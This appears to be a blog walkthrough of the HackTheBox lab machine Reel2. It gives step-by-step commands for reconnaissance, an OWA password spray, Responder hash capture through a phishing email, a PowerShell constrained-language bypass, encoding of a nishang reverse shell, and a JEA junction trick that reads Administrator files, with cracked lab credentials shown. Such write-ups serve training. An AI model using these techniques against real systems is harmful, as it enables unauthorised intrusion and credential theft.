Hello friends!
Today I'm going to take you around a special machine on hackthebox platform: Reel2
<img src="/src/reel2.png">

It was a hard machine as the statistiques show!
First we start as usual with running <emb>nmap</emb> to see open ports and services.

<span style="color:blue"><emb># nmap -sV -T4 -oA nmap 10.10.10.210</emb></span>

The result shows a bunch of ports: 80, 443, 8080, 600x.


<img src="/src/nmap1.png" width="1000" height="300">

We will start by ports 80 and 443, which only show a default windows IIS server default page. In this case we will launch a directory/files brute force to see if can find some juicy entries.

<span style="color:blue"><emb># dirsearch.py -e php,html -u http://10.10.10.210/ -t 50 -w wordlist.txt</emb></span>


<span style="color:blue"><emb># dirsearch.py -e php,html -u https://10.10.10.210/ -t 50 -w wordlist.txt</emb></span>


The results show the existing of exchange server and the web posrtal is accessible through https://10.10.10.210/owa (we can guess from the fisrt look that the exchange version is 2010)

Next step is to build username and password lists to brute force the OWA access. At this point we can use large wordlists but it may take an eternity to finish the attack.

The next open port is 8080 which exposes a social media website called "wallstant". We create a new account and start to look for some vulnerablities on that site. As by now, we will use this site to generate wordlists for username and password.


The following command will generate a worldlist using CEWL program (-m is used for minimum word length, -d used depth to spider):


<span style="color:blue"><emb># cewl -w passlist.txt -m 2 -d 4 -H Cookie:PHPSESSID=q7lmf0h6m81u4propu0r1s4reh --proxy_host 127.0.0.1 --proxy_port 8080 http://10.10.10.210:8080/</emb></span>


To generate a wordlist for usernames we make a curl to search endpoint which contains names of blog users.


<span style="color:blue"><emb># curl -v --cookie "PHPSESSID=q7lmf0h6m81u4propu0r1s4reh" http://10.10.10.210:8080/search > site.txt</emb></span>


The following will create a list from the output of curl command:


<span style="color:blue"><emb># html2dic site.txt >> list.txt</emb></span>

You can also use some burp extensions to generate those wordlists: <a href="https://github.com/PortSwigger/wordlist-extractor">Example 1</a> or <a href="https://github.com/tinmyowin7/Wordlist-Generator">Example 2</a>


After generating those wordlists we have many tools to perform a password spray attack: Take every username in the user's list and test it against every password in password's list.
Examples of tools: <a href="https://github.com/sensepost/ruler">Ruler</a>, <a href="https://github.com/byt3bl33d3r/SprayingToolkit">SprayToolkit</a>


<span style="color:blue"><emb># ./atomizer.py owa http://reel2:443/owa passwords.txt users.txt --threads 20 --debug --interval 0:0:2</emb></span>


After some time we have a valid credentials: <span style="color:red">s.svensson:Summer2020</span>


We login with s.svensson account, and we can see that we have a list of users in the owa adress book, an evident tought that come to our mind is to send a phishing email to all users, with an email body set to out attacker machine. 


We set our responder as follow: <span style="color:blue"><emb># responder -I tun0 -v</emb></span>


A few seconds later we got NTLMv2 hash for a k.svensson, and we launch hashcat to crack that hash: <span style="color:red">k.svensson:kittycat1</span>


At this stage we will try to use this crendentials to execute powershell remoting, we had a problem of ConstrainedLanguage mode in that powershell session. To bypass this restriction we can create a function and call it, or we use the & sign to execute commands. So the following will execute `whoami` command: 


```
PS> Invoke-Command -ComputerName 10.10.10.210 -Credential 'HTB.local\k.svensson' -Authentication Negotiate -ScriptBlock {&{whoami}}

PowerShell credential request
Enter your credentials.                                                                                                                                                          
Password for user HTB.local\k.svensson: *********

htb\k.svensson
```

Next we want to get a reverse shell on the box.
We will use nishang and base64 encode it:


<span style="color:blue"><emb># cat Invoke-PowershellTcpOnLine.ps1 | iconv -t utf-16le | base64 -w 0</emb></span>


And then we send it to get the reverse shell with `-enc` to decrypt it:
<img src="/src/rev1.png" width="1000" height="300">

We can read the user.txt flag.

Next step is to have administrator access to the box or at least find out a way to read the root.txt flag!

In the desktop of k.svensson we see a Sticky Note link wich can be a good start to find some interesting stuff.

We can search for specific files or some content that have specific terms like "password", "psrc", "pssc" or "jea".

The following command helps us to look for files that end with `.log` extension: 

<span style="color:blue"><emb>PS> get-childitem -path C:\ -File -Recurse -Include *.log -ErrorAction SilentlyContinue -Force</emb></span>

The search shows us a file that contains credentials for a new account: <span style="color:red">jea_test_account:Ab!Q@vcg^%@#1</span>

We spent some time reading about JEA (Just Enough Administration), which is a security technology that enables delegated administration for anything managed by PowerShell. Reading the configuration files (C:\Users\k.svensson\Documents\jea_test_account.psrc and C:\Users\k.svensson\Documents\jea_test_account.pssc), we discover that jea_test_account is the only user who can execute a commandlet named `Check-File` which gets the content of a file only if it is inside `D:/` or `C:/ProgramData`

The final step is the create a Junction which is a soft link for folders in Windows (like symbolic links in Linux).

<span style="color:blue"><emb>PS> New-Item -ItemType Junction -Path 'C:\ProgramData\hecsv' -Target 'C:\Users\Administrator'</emb></span>

All what we have to do is to login as jea_test_account and read the root.txt through check-file cmdlet.

To connect to jea we do the following:

  
```
$user = "jea_test_account"
  

PS> $pass = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText -Force


PS> $cred = New-Object System.Management.Automation.PSCredential -ArgumentList  ($user, $pass)


PS> Enter-PSSession -Computer 10.10.10.210 -credential $cred -ConfigurationName jea_test_account -verbose -debug -Authentication Negotiate
```

<img src="/src/root2.png" width="1000" height="150">

`Check-File C:\programdata\hecsv\Desktop\root.txt`

<img src="/src/root3.png">

That's it for today, hope you enjoyed the read!

See you next time.
